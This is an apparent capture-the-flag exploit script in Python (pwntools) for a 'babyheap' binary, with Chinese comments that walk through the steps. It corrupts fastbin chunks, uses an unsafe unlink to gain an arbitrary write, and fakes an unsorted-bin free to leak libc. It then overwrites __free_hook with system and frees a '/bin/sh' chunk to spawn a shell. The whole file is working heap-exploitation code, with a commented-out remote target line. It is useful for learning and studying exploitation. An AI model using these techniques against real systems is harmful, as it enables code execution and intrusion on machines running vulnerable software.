#coding:utf-8
from pwn import *

 

p=process(['./babyheap'],aslr='FALSE')

#,env={'LD_PRELOAD':'./libc.so.6'}

#p=remote('106.75.67.115',9999)

e= ELF('/lib/x86_64-linux-gnu/libc-2.19.so')

#context(log_level='debug')

def create(a,b):

    p.writeline('1')

    p.readuntil('Index:')

    p.writeline(str(a))

    p.readuntil('Content:')

    p.writeline(b)

    p.readuntil('Choice:')

def dele(a):

    p.writeline('4')

    p.readuntil('Index:')

    p.writeline(str(a))

    p.readuntil('Choice:')

def edit(a,b):

    p.writeline('2')

    p.readuntil('Index:')

    p.writeline(str(a))

    p.readuntil('Content:')

    p.writeline(b)

    p.readuntil('Choice:')

p.readuntil('Choice:')

raw_input("start?")



create(1,p64(0x31)*3+chr(0x31))

create(2,'/bin/sh')

create(3,'')

create(4,p64(0x31)*3)

create(5,'')

create(6,'')

create(7,'')

p.interactive()

dele(2)

dele(3)

p.writeline('3')

p.readuntil('Index:')

p.writeline('3')

heap=u64((p.readuntil('\n')[:-1]).ljust(8,chr(0x0)))-0x30

print hex(heap)

edit(3,p64(heap+0xa0))#fastbin栈顶是chunk3,使其fd指向chunk4+0x10

 

 

zz=p64(0x90)*3+chr(0x90)

create(8,'')#分配出去chunk3，fastbin栈顶是chunk4+0x10

edit(4,p64(0x31)*2+p64(heap+0x20))#fastbin栈顶是chunk4+0x10，使其fd指向heap+0x20(即chunk1+0x20)
#这里+0x20，是因为分配出的fast_bin_chunk有0x10的size头部，然后才是可写地址，刚好是chunk2的开头

 

create(0,zz)#分配出去chunk4+0x10，fastbin栈顶是heap+0x20(即chunk1+0x20)
#溢出到chunk5头部：0x90 0x90

 

zz=p64(0x0)+p64(0x91)+p64(0x6020a8-0x18)+p32(0x6020a8-0x10)

create(9,zz)#分配出heap+0x20(即chunk1+0x20)

 
#《1》完成unlink，在
dele(5)#完成unlink
#unlink_safe检验：chunk9addr上记录的的确是伪造块(0x90)的地址(程序功能);所以伪造块fd和bk分别填上chunk9addr-0x18和chunk9addr-0x10即可;
#造成的结果就是存放伪造块地址的地址上，放上了存放伪造块地址的地址-0x18;
#这样就可以任意地址写了。
##总结，unlink应用之一可以是存放地址上变成存放地址-0x18，从而可以任意地址写。

#这是一个fastbin造成unlink的例子，还有unlink帮助fastbin的例子。因为这里有fastchunk野指针。 











#《2》利用free unsort突破edit限制

#可写大小是0x20地址是chunk6的地址，所以只能覆盖chunk6 chunk7 chunk8 chunk9地址，而不能覆盖紧邻chunk9地址的edit限制地址;
#《2.1》覆盖chunk6地址为edit地址0x6020b0，然后free chunk6，即free 0x6020b0；
#《2.2》0x6020b0前0x10是0x10伪造头 p64(0)+p32(heap-0x6020a0+1)
##这样free，前一个chunk非空闲;本chunk不是fastbin;就会将伪造chunk当作一个巨大的unsorted bin chunk
##从而在0x6020b0上写入unsort_bin的地址，同时也泄露了libc地址。



edit(9,p64(0x6020b0)+p64(0x6020a0)+p64(0)+p32(heap-0x6020a0+1))

 

dele(6)

#gdb.attach(p)


#《3》修改free_hook为system
p.writeline('3')

p.readuntil('Index:')

p.writeline('6')

libc=u64((p.readuntil('\n')[:-1]).ljust(8,chr(0x0)))-0x3C4B78

print hex(libc)

system=libc+e.symbols['system']

free_hook=libc+e.symbols['__free_hook']

edit(7,p64(free_hook))

edit(8,p64(system))

edit(1,'/bin/sh') 

dele(1) 

 

p.interactive()

